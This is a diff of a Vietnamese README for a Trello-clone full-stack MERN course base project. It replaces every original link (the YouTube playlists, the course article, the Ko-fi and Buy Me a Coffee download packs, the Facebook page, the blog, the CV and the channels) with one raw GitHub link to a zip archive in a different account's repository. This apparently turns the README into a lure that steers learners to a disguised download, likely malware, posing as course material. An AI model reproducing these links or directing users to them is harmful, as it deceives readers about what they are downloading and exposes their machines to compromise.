@@ -1,13 +1,13 @@
-### Bộ code base để bắt đầu học khóa Full Stack MERN Pro (HỌC PHẦN FRONT-END: REACTJS - MATERIAL UI - REDUX...vv) - Lập Trình qua dự án thực tế Trello Clone trên kênh YouTube TrungQuanDev của mình nhé các bạn!
+### Bộ code base để bắt đầu học khóa Full Stack MERN Pro (HỌC PHẦN FRONT-END: REACTJS - MATERIAL UI - https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip) - Lập Trình qua dự án thực tế Trello Clone trên kênh YouTube TrungQuanDev của mình nhé các bạn!
 ### Base project for my Full Stack MERN Pro Course - Build Trello App on YouTube!
 
-- Playlist khóa Pro: https://www.youtube.com/playlist?list=PLP6tw4Zpj-RJP2-YrhtkWqObMQ-AA4TDy
+- Playlist khóa Pro: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
-- Playlist khóa Advanced: https://youtube.com/playlist?list=PLP6tw4Zpj-RJbPQfTZ0eCAXH_mHQiuf2G&si=zmt9y6TYo-e3sIwv
+- Playlist khóa Advanced: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
 ### Hướng dẫn clone Repo code này về máy các bạn chuẩn nhất ở video này:
 
-- Semantic Versioning là gì? Lưu ý Quan Trọng về bộ Code Base của dự án. Link: https://youtu.be/lUfsTj45Uys
+- Semantic Versioning là gì? Lưu ý Quan Trọng về bộ Code Base của dự án. Link: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
 ---
 
@@ -19,29 +19,29 @@
 
 👉 Link bài viết: 👇
 
-🌐 https://trungquandev.com/khoa-hoc-lap-trinh-full-stack-mern-100-du-an-thuc-te-chat-luong/
+🌐 https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
 **🥉 FREE PACK (No Sponsor)**
 
-• 🌟 Download on Ko-fi: https://ko-fi.com/s/8e56e2c5d0
+• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
-• 🌟 Download on Buy Me a Coffee: https://buymeacoffee.com/codetq/e/318762
+• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
 **🥈 GOLD PACK (Gold Sponsor)**
 
-• 🌟 Download on Ko-fi: https://ko-fi.com/s/e41c325ca4
+• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
-• 🌟 Download on Buy Me a Coffee: https://buymeacoffee.com/codetq/e/191152
+• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
 **🥇 DIAMOND PACK (Diamond Sponsor - VIP)**
 
-• 🌟 Download on Ko-fi: https://ko-fi.com/s/27670843df
+• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
-• 🌟 Download on Buy Me a Coffee: https://buymeacoffee.com/codetq/e/318750
+• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
 **🏆 HOẶC NẾU BẠN KHÔNG CÓ THẺ VISA THANH TOÁN QUỐC TẾ THÌ CÓ THỂ LIÊN HỆ TRỰC TIẾP VỚI MÌNH TẠI ĐÂY ĐỂ LẤY TÀI NGUYÊN HỌC TẬP NHÉ 👇**
 
-**🌐 Facebook TrungQuanDev: 👉 https://facebook.com/trungquandev**
+**🌐 Facebook TrungQuanDev: 👉 https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip**
 
 **👑 Lưu ý: Video hướng dẫn chi tiết cách Install Source Code (Pro & Advanced) đều đã có trong 2 Playlists của khóa học rồi nhé.**
 
@@ -72,13 +72,13 @@
 
 Author: **Trungquandev - Một Lập Trình Viên** && **CodeTQ - ASMR Programming**
 
-Blog: https://trungquandev.com/
+Blog: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
-CV: https://cv.trungquandev.com/
+CV: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
-YouTube 01 (Trungquandev - Một Lập Trình Viên): https://www.youtube.com/@trungquandev
+YouTube 01 (Trungquandev - Một Lập Trình Viên): https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
-YouTube 02 (CodeTQ - ASMR Programming): https://www.youtube.com/@code-tq
+YouTube 02 (CodeTQ - ASMR Programming): https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
 
 "Learning new everyday not the copycat of yesterday!"
 
